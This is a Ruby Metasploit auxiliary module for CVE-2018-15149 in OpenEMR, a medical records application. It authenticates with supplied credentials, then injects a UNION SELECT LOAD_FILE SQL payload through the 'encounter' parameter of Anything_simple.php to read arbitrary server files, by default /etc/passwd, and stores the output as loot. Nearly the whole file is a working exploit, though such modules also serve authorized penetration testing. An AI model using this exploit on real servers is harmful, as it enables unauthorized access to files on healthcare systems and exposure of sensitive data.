##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'OpenEMR prior to 5.0.1.4 SQL Injection in encounter parameter',
        'Description'    => %q{
          This module exploits an SQL injection vulnerability in OpenEMR prior to
          version 5.0.1.4. The vulnerability exists in interface/forms/eye_mag/php/Anything_simple.php
          where the encounter parameter is passed unsanitized to getProviderIdOfEncounter()
          in library/forms.inc. This allows an authenticated attacker to read arbitrary
          files from the filesystem using MySQL LOAD_FILE() function.
        },
        'Author'         => [
          'AMENDER',
          'Rezwanul Haque'
        ],
        'License'        => MSF_LICENSE,
        'References'     => [
          ['CVE', '2018-15149']
        ],
        'DisclosureDate' => 'Aug 13, 2018',
        'Notes'          => {
          'Stability'   => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [NO_SIDE_EFFECTS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGET_URI', [true, 'The base path to OpenEMR', '/']),
        OptString.new('USERNAME', [true, 'The username for authentication', 'admin']),
        OptString.new('PASSWORD', [true, 'The password for authentication', '']),
        OptString.new('SITE', [true, 'The OpenEMR site name', 'default']),
        OptString.new('TARGETFILE', [true, 'The file to read from the target', '/etc/passwd'])
      ]
    )
  end

  def target_uri
    normalize_uri(datastore['TARGET_URI'])
  end

  def authenticate
    print_status('Attempting authentication...')

    auth_uri = normalize_uri(target_uri, 'interface', 'main', 'main_screen.php')

    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => auth_uri,
      'vars_get'  => {
        'auth' => 'login',
        'site' => datastore['SITE']
      },
      'vars_post' => {
        'new_login_session_management' => '1',
        'authProvider'                 => 'Default',
        'authUser'                     => datastore['USERNAME'],
        'clearPass'                    => datastore['PASSWORD'],
        'languageChoice'               => '1'
      }
    )

    unless res
      print_error('No response received during authentication')
      return nil
    end

    if res.code == 302 || res.code == 200
      cookies = res.get_cookies
      if cookies && !cookies.empty?
        if res.body && (res.body.include?('Invalid') || res.body.include?('denied') || res.body.include?('error'))
          print_error('Authentication failed - invalid credentials')
          return nil
        end
        print_good('Authentication successful')
        return cookies
      end
    end

    if res.body && (res.body.include?('Invalid') || res.body.include?('Login') || res.body.include?('denied'))
      print_error('Authentication failed - invalid credentials or access denied')
      return nil
    end

    print_error('Authentication failed - unable to obtain session cookie')
    nil
  end

  def exploit_sqli(cookies)
    print_status("Attempting to read file: #{datastore['TARGETFILE']}")

    vuln_uri = normalize_uri(target_uri, 'interface', 'forms', 'eye_mag', 'php', 'Anything_simple.php')

    file_path = datastore['TARGETFILE']
    sqli_payload = "1 UNION SELECT LOAD_FILE('#{file_path}')-- -"

    res = send_request_cgi(
      'method'   => 'GET',
      'uri'      => vuln_uri,
      'cookie'   => cookies,
      'vars_get' => {
        'encounter' => sqli_payload
      }
    )

    unless res
      print_error('No response received from vulnerable endpoint')
      return nil
    end

    if res.code != 200
      print_error("Unexpected response code: #{res.code}")
      return nil
    end

    res.body
  end

  def run
    cookies = authenticate
    unless cookies
      print_error('Authentication failed')
      return
    end

    result = exploit_sqli(cookies)
    unless result
      print_error('Failed to retrieve file content')
      return
    end

    if result.include?('root:x:0:0') || result.include?(datastore['TARGETFILE'].split('/').last)
      print_good('[+] File content:')
      print_line(result)

      loot_path = store_loot(
        'openemr.file',
        'text/plain',
        datastore['RHOSTS'],
        result,
        datastore['TARGETFILE'],
        'OpenEMR SQL Injection File Read'
      )
      print_good("File saved to: #{loot_path}")
    elsif result.include?('login') || result.include?('Login') || result.include?('Invalid') || result.include?('denied') || result.include?('error')
      print_error('Session may have expired or access denied')
    elsif result.strip.empty?
      print_error('Empty response - file may not exist or is not readable')
    else
      print_status('Response received (may contain file content):')
      print_good('[+] File content:')
      print_line(result)

      loot_path = store_loot(
        'openemr.file',
        'text/plain',
        datastore['RHOSTS'],
        result,
        datastore['TARGETFILE'],
        'OpenEMR SQL Injection File Read'
      )
      print_good("File saved to: #{loot_path}")
    end
  end
end